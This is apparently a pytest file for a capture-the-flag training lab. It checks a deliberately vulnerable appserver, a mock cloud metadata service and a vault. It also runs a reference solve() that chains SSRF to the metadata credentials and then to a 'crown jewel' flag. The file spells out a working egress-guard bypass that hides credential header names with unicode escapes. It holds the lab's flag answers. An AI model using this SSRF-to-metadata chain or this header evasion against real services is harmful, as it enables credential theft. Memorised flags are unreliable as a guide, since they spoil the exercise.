"""Module 09 crown-jewel chain.

Pins the two wrong paths (literal credential headers; replaying the IMDSv1 flag)
and the reference exploit, which is only given the appserver URL — metadata and
the vault are reached by SSRF, the way a link-local IMDS is reached.
"""
from __future__ import annotations

import importlib.util
import json
import socket
import subprocess
import sys
import time
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient

REPO = Path(__file__).resolve().parents[1]
MOD = REPO / "modules" / "09-infra-deployment"
V1_FLAG = "REDSEC{infra_ssrf_to_cloud_metadata}"
CROWN = "REDSEC{infra_role_chain_to_crown_jewel}"


def _load(rel: str, name: str):
    path = REPO / rel
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _escape_key(name: str) -> str:
    return "".join(f"\\u{ord(ch):04x}" for ch in name)


def test_egress_guard_rejects_literal_credential_headers(monkeypatch):
    appmod = _load("modules/09-infra-deployment/targets/appserver/app.py", "m09_appserver_guard")
    called: list[str] = []

    def _no_network(*_a, **_k):
        called.append("called")
        raise AssertionError("guard should refuse before the fetcher dials")

    monkeypatch.setattr(appmod.httpx, "request", _no_network)
    client = TestClient(appmod.app)
    for header in (
        "X-Initrode-Role",
        "X-aws-ec2-metadata-token",
        "X-aws-ec2-metadata-token-ttl-seconds",
        "Authorization",
    ):
        res = client.post("/fetch", json={"url": "http://metadata/latest/api/token", "headers": {header: "1"}})
        assert res.json()["error"] == "egress guard rejected a credential header", header
    assert called == []


def test_egress_guard_forwards_unicode_escaped_header_names(monkeypatch):
    appmod = _load("modules/09-infra-deployment/targets/appserver/app.py", "m09_appserver_bypass")
    captured: dict = {}

    class _Resp:
        status_code = 200
        text = "ok"

    def _capture(method, url, headers=None, timeout=None):
        captured["method"] = method
        captured["url"] = url
        captured["headers"] = headers
        return _Resp()

    monkeypatch.setattr(appmod.httpx, "request", _capture)
    client = TestClient(appmod.app)
    key = _escape_key("X-Initrode-Role")
    # Single backslash-u escapes, so the raw body does not contain the header name.
    body = (
        '{"url": "http://vault/v1/secret/data/crown", "method": "PUT", "headers": {"'
        + key
        + '": "ij-crown-session"}}'
    )
    assert b"x-initrode-role" not in body.lower().encode()
    res = client.post("/fetch", content=body.encode(), headers={"content-type": "application/json"})
    assert res.status_code == 200
    assert "error" not in res.json()
    assert captured["method"] == "PUT"
    assert captured["headers"]["X-Initrode-Role"] == "ij-crown-session"


def test_imds_v1_unchanged_and_v2_document_has_no_flag():
    meta = _load("modules/09-infra-deployment/targets/metadata/app.py", "m09_metadata")
    client = TestClient(meta.app)
    v1 = client.get("/latest/meta-data/iam/security-credentials/role").json()
    assert v1["SecretAccessKey"] == V1_FLAG
    assert "Vault" not in v1

    missing = client.put("/latest/api/token")
    assert missing.status_code == 400
    token = client.put(
        "/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    ).text
    assert token == "imdsv2-session"
    v2 = client.get(
        "/latest/meta-data/iam/security-credentials/initrode-inference-role",
        headers={"X-aws-ec2-metadata-token": token},
    ).json()
    assert "REDSEC{" not in json.dumps(v2)
    assert v2["SecretAccessKey"] == "ij-crown-session"
    assert v2["CredentialHeader"] == "X-Initrode-Role"
    assert v2["Vault"].endswith("/v1/secret/data/crown")
    # The same path without the session token is still the v1 teaching credential.
    assert client.get(
        "/latest/meta-data/iam/security-credentials/initrode-inference-role"
    ).json()["SecretAccessKey"] == V1_FLAG


def test_vault_rejects_imdsv1_and_accepts_role_secret():
    vault = _load("modules/09-infra-deployment/targets/vault/app.py", "m09_vault")
    client = TestClient(vault.app)
    assert client.get("/v1/secret/data/crown").status_code == 401
    rejected = client.get("/v1/secret/data/crown", headers={"X-Initrode-Role": V1_FLAG})
    assert rejected.status_code == 403
    assert "imdsv1" in rejected.text
    ok = client.get("/v1/secret/data/crown", headers={"X-Initrode-Role": "ij-crown-session"})
    assert ok.status_code == 200
    assert ok.json()["data"]["flag"] == CROWN


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _wait(url: str) -> None:
    deadline = time.time() + 20
    while time.time() < deadline:
        try:
            if httpx.get(url, timeout=1).status_code == 200:
                return
        except Exception:
            time.sleep(0.15)
    raise RuntimeError(f"not ready: {url}")


@pytest.mark.timeout(60)
def test_reference_exploit_only_needs_the_appserver():
    """The sealed chain is a deputy path: solve() is not told where metadata or vault are."""
    meta_port, vault_port, app_port = _free_port(), _free_port(), _free_port()
    base = dict(**{k: v for k, v in __import__("os").environ.items()})
    specs = [
        (MOD / "targets" / "metadata", meta_port, {
            **base,
            "REDSEC_URL_VAULT": f"http://127.0.0.1:{vault_port}",
        }),
        (MOD / "targets" / "vault", vault_port, base),
        (MOD / "targets" / "appserver", app_port, {
            **base,
            "REDSEC_URL_METADATA": f"http://127.0.0.1:{meta_port}",
        }),
    ]
    procs: list[subprocess.Popen] = []
    try:
        for cwd, port, env in specs:
            procs.append(subprocess.Popen(
                [sys.executable, "-m", "uvicorn", "app:app",
                 "--host", "127.0.0.1", "--port", str(port), "--log-level", "warning"],
                cwd=cwd, env=env,
            ))
        for port in (meta_port, vault_port, app_port):
            _wait(f"http://127.0.0.1:{port}/healthz")

        # A literal credential header never reaches the vault.
        blocked = httpx.post(
            f"http://127.0.0.1:{app_port}/fetch",
            json={"url": f"http://127.0.0.1:{vault_port}/v1/secret/data/crown",
                  "headers": {"X-Initrode-Role": "ij-crown-session"}},
            timeout=10,
        ).json()
        assert blocked["error"] == "egress guard rejected a credential header"

        spec = importlib.util.spec_from_file_location(
            "m09_solve", MOD / "solution" / "solve.py")
        assert spec and spec.loader
        sol = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(sol)
        flags = sol.solve({"appserver": f"http://127.0.0.1:{app_port}"}, None)["flags"]
        assert flags["metadata-ssrf"] == V1_FLAG
        assert flags["open-inference-api"] == "REDSEC{infra_unauthenticated_inference_admin}"
        assert flags["registry-secrets"] == "REDSEC{infra_secret_in_model_registry}"
        assert flags["crown-jewel-chain"] == CROWN
        # The v1 flag must not satisfy the sealed challenge.
        assert flags["crown-jewel-chain"] != flags["metadata-ssrf"]
    finally:
        for p in procs:
            p.terminate()
        for p in procs:
            try:
                p.wait(timeout=5)
            except subprocess.TimeoutExpired:
                p.kill()
